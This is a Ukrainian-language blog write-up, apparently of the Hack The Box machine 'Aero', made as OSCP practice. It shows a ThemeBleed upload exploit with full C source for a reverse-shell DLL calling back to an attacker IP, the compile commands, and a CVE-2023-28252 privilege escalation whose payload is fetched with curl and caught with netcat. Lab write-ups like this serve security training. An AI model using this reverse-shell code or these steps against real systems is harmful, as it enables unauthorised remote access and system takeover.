---
layout: post
title: "Hack The Box - Aero"
date: 2025-12-05
---

Hack the Box - Aero

Планую я здавати OSCP в наступному році, і як платформу для практики використовую Hack the Box. Сьогодні на столі для препарації машини рівня Medium, Віндова Aero. 
Класичний nmap показує нам 1 порт - 80. Відкривши в браузері - отримуємо:
<img style="height:auto; max-width:100%" alt="Screenshot 2025-12-04 235049" src="https://github.com/user-attachments/assets/c8679382-83c2-4aa4-9f5d-1b1858dd30bd" />


І як істинний пентестер ідемо в upload). І приймає він тільки 2 файли .themepack і .theme .  В класичному пентесті, я б спробував обійти ці обмеження, але тут ми вийдемо з того що маємо, загугливши експлуатацію цих файлів - знаходимо віндовий(хто б сумнівався) експлойт - вінда довіряє .theme файлам як рідній мамі і запускає ліби(dll) які вони підтягують. Чуєш, до чого це веде)???
Знаходимо PoC і клонуємо з гіта: https://github.com/Durge5/ThemeBleedPy.git 
Але машина все ж медіум рівня, нам не дозволять просто взяти чужий код. Взагалі градація наступна: easy - копіюєш пейлоад з інета, medium -копіюєш пейлоад з інета і модифікуєш, hard - пишеш свій пейлоад, insane - вигадуєш нові вразливості(write up hack the box по insane машині - близько 100 сторінок). Тож сам експлойт тут працює за принципом завантаження .them, який підтягує stage_1 і stage_2, а вони вже наш власний stage_3. Головна умова - stage_3 - dll файл з експортованою функцією VerifyThemeVersion. Ідемо на https://www.revshells.com/, генеруємо пейлоад на c, міняємо функції і додаємо до експортованої

`extern "C" __declspec(dllexport) int VerifyThemeVersion(void)`

Це дасть компілятору зрозуміти, що цю треба експортувати(зробити доступною для виклику ззовні. 
Ось весь код:
```
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "10.10.14.18"; 
char port[6] = "9001";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int rev_shell()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}

extern "C" __declspec(dllexport) int VerifyThemeVersion(void)
{
    rev_shell();
    return 0;
}

```

Тоді треба скомпілювати, для Visual Studio компілятора

`cl.exe /MD /LD file.cpp`

А для любителів свободи - mingw 

`mingw32-gcc main.c -shared -o stage_3 -lws2_32`

Отримуємо dll, перейменовуємо на stage_3 і запускаємо python експлойт(він хостить 445 порт, тому з вінди ще треба поїбатися з зупинкою всього що слухає 445 до нас)
Завантажуємо в форму наш .theme файл(в ньому треба прописати свій айпішник) і слухаєио цільовий порт на нашій машині неткатом, щоб зловити реверс шел. А далі - лірика, файли один за одним зтягуються і запускають нашу власну dll.
<img style="height:auto; max-width:100%" alt="image" src="https://github.com/user-attachments/assets/839847b4-3922-4dc8-af11-121550572b49" />

І шел на руках:
<img style="height:auto; max-width:100%" alt="image" src="https://github.com/user-attachments/assets/98335101-97e4-412c-8d95-849c64f50700" />

Як ми бачимо, в системі ми не адмін і не system( Тому далі ескалація привілеїв. На вінді вона зазвичай дуже двина і непряма. Пролиставши директорії в нашій домашній папці, знаходимо файл  `CVE-2023-28252_Summary.pdf` . Виглядає як дуже прозорий натяк) Сам експлойт досить адвансед, використовує вразливість драйвера.
Гуглимо і знаходимо дуже(дуже) детальний розбір цієх вразливості https://github.com/fortra/CVE-2023-28252 . Це експлойт який запускає блокнот від імені NT AUTHORITY\SYSTEM, що теж круто, але не прям вау)
Скачуємо код, відкриваємо в Visual studio і міняємо `notepad.exe` на наш пейлоад, персонально я взяв з того ж самого revshells.com powershell base64. Компілимо кінцевий .exe і завантажуємо його на машину. Для тих хто все ще любить запах свободи, на гітхабі валяються прекомпілені exe-шники, щоб не морочити голову з Visual studio. Для того щоб файл був на машині, я запустив пайтон сервак(`python -m http.server 80`), а на жертві запустив `curl http://myip/file.exe -o file.exe`. А далі просто запуск і ловля нового шела netcat-ом.   

<img style="height:auto; max-width:100%" alt="image" src="https://github.com/user-attachments/assets/fac1d2bf-3c43-4250-9655-ea21c31156ef" />


Мораль:
Гарна віндова тачка, яка поки не змушує, а тільки легенько натякає - чужими експлойтами ситий не будеш. 
P.S. Вінда як завжди решето) 


